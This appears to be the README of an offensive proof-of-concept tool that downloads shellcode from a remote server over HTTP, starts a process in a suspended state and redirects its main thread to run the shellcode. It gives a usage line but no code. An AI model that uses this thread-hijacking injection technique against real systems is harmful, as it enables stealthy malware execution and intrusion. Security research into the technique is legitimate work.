## SdiWebRemHijack

PoC to perform Remote Process Thread Hijack using shellcode retrieved from remote server via HTTP.

### Usage

`sdiwebremhijack <url> <process>` -> Fetches payload from `<url>`, creates new `<process>` in suspended state, and redirects main thread to point to allocated shellcode.